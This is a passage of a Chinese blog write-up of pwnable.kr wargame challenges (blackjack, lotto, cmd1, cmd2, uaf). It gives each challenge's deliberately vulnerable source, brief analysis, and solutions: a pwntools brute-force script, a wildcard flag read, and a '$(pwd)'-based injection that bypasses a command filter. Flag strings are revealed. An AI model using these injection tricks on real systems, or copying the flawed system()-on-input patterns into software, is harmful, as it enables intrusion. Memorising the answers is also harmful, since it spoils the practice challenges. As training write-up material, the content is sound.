class="token punctuation">,</span> loss<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">fprintf</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">,</span><span class="token string">"\nKeep Playing and Set an All-Time Record!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token function">fclose</span><span class="token punctuation">(</span>fpresults<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span></code></pre><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>问题主要出自betting函数</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Asks user amount to bet</span><span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nEnter Bet: $"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>bet <span class="token operator">></span> cash<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//If player tries to bet more money than player has</span> <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYou cannot bet more money than you have."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter Bet: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bet<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> bet<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">return</span> bet<span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End Function</span></code></pre><ol><li>选择在第二次输入时直接输1000000，无脑赌到赢</li><li>选择第一次输入-1000000，无脑赌到输</li></ol><p>因为最后计算金额时候，不是<code>cash = cash + bet;</code>就是<code>cash = cash - bet;</code>分别对应两种利用</p><h3 id="解题-11"><a href="#解题-11" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">YaY_I_AM_A_MILLIONARE_LOLCash: $1000500-------|H    ||  2  ||    H|-------Your Total is 2The Dealer Has a Total of 10</code></pre><h2 id="13-lotto"><a href="#13-lotto" class="headerlink" title="13. lotto"></a>13. lotto</h2><h3 id="题目-12"><a href="#题目-12" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> submit<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Submit your 6 lotto bytes : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> r<span class="token punctuation">;</span>    r <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> submit<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Lotto Start!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//sleep(1);</span>    <span class="token comment" spellcheck="true">// generate lotto numbers</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error. tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> lotto<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> lotto<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"error2. tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">45</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 1 ~ 45</span>    <span class="token punctuation">}</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// calculate lotto score</span>    <span class="token keyword">int</span> match <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> submit<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                match<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// win!</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>match <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad luck...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- nLotto Rule -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"nlotto is consisted with 6 random natural numbers less than 46\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"your goal is to match lotto numbers as many as you can\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"if you win lottery for *1st place*, you will get reward\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"for more details, follow the link below\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"mathematical chance to win this game is known to be 1/8145060.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// menu</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> menu<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"- Select Menu -\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1. Play Lotto\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2. Help\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3. Exit\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>menu<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>menu<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>                <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>                <span class="token function">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bye\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"invalid menu\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>原来这里两层循环来判断提交的值是否<strong>都</strong>在 lotto 中出现，但是逻辑上是有问题的</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// calculate lotto score</span>    <span class="token keyword">int</span> match <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>lotto<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> submit<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                match<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>实际上这段代码是检测提交的值是否在 lotto 中出现，和原来本意有很大的出入，因为我们可以输入 6 同样的值，只要保证这个值在 lotto 里出现即可完成破解</p><h3 id="解题-12"><a href="#解题-12" class="headerlink" title="解题"></a>解题</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>conn <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"pwnable.kr"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"lotto"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"guest"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> conn<span class="token punctuation">.</span>process<span class="token punctuation">(</span>executable<span class="token operator">=</span><span class="token string">"/home/lotto/lotto"</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Exit"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"1"</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bytes :"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bad luck..."</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="14-cmd1"><a href="#14-cmd1" class="headerlink" title="14. cmd1"></a>14. cmd1</h2><h3 id="题目-13"><a href="#题目-13" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> cmd<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> r<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"tmp"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> envp<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PATH=/thankyouverymuch"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><ul><li>strstr：返回字符串str中第一次出现子串substr的地址；如果没有检索到子串，则返回NULL</li></ul><p>filter 中过滤了三个字符串<code>flag</code>、<code>sh</code>、<code>tmp</code></p><p>但是？？？还是没明白和 PATH 的关系</p><h3 id="解题-13"><a href="#解题-13" class="headerlink" title="解题"></a>解题</h3><p>通配符直接上，跟题目没太大关系</p><pre class=" language-shell"><code class="language-shell">cmd1@pwnable:~$ /home/cmd1/cmd1 "/bin/cat /home/cmd1/f*"mommy now I get what PATH environment is for :)</code></pre><h2 id="15-cmd2"><a href="#15-cmd2" class="headerlink" title="15. cmd2"></a>15. cmd2</h2><h3 id="题目-14"><a href="#题目-14" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">int</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> cmd<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> r<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"="</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"PATH"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"export"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"`"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    r <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">strstr</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">extern</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> environ<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">delete_env</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> p<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>p<span class="token operator">=</span>environ<span class="token punctuation">;</span> <span class="token operator">*</span>p<span class="token punctuation">;</span> p<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> envp<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">delete_env</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"PATH=/no_command_execution_until_you_become_a_hacker"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><p>过滤更彻底，想办法绕</p><h3 id="解题-14"><a href="#解题-14" class="headerlink" title="解题"></a>解题</h3><pre class=" language-shell"><code class="language-shell">cmd2@pwnable:~$ cd /cmd2@pwnable:/$ /home/cmd2/cmd2 '$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f???'$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)f???FuN_w1th_5h3ll_v4riabl3s_haha</code></pre><h2 id="16-uaf"><a href="#16-uaf" class="headerlink" title="16. uaf"></a>16. uaf</h2><h3 id="题目-15"><a href="#题目-15" class="headerlink" title="题目"></a>题目</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span> </span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstring></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;cstdlib></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>using namespace std<span class="token punctuation">;</span>class Human<span class="token punctuation">{</span>private<span class="token punctuation">:</span>    virtual <span class="token keyword">void</span> <span class="token function">give_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>protected<span class="token punctuation">:</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span>    string name<span class="token punctuation">;</span>public<span class="token punctuation">:</span>    virtual <span class="token keyword">void</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"My name is "</span> <span class="token operator">&lt;&lt;</span> name <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I am "</span> <span class="token operator">&lt;&lt;</span> age <span class="token operator">&lt;&lt;</span> <span class="token string">" years old"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>class Man<span class="token punctuation">:</span> public Human<span class="token punctuation">{</span>public<span class="token punctuation">:</span>    <span class="token function">Man</span><span class="token punctuation">(</span>string name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">{</span>        this<span class="token operator">-></span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        this<span class="token operator">-></span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        virtual <span class="token keyword">void</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        Human<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I am a nice guy!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>class Woman<span class="token punctuation">:</span> public Human<span class="token punctuation">{</span>public<span class="token punctuation">:</span>        <span class="token function">Woman</span><span class="token punctuation">(</span>string name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span><span class="token punctuation">{</span>                this<span class="token operator">-></span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>                this<span class="token operator">-></span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        virtual <span class="token keyword">void</span> <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        Human<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"I am a cute girl!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    Human<span class="token operator">*</span> m <span class="token operator">=</span> new <span class="token function">Man</span><span class="token punctuation">(</span><span class="token string">"Jack"</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Human<span class="token operator">*</span> w <span class="token operator">=</span> new <span class="token function">Woman</span><span class="token punctuation">(</span><span class="token string">"Jill"</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    size_t len<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> data<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> op<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"1. use\n2. after\n3. free\n"</span><span class="token punctuation">;</span>        cin <span class="token operator">>></span> op<span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span>op<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>                m<span class="token operator">-></span><span class="token function">introduce</span><span class="token 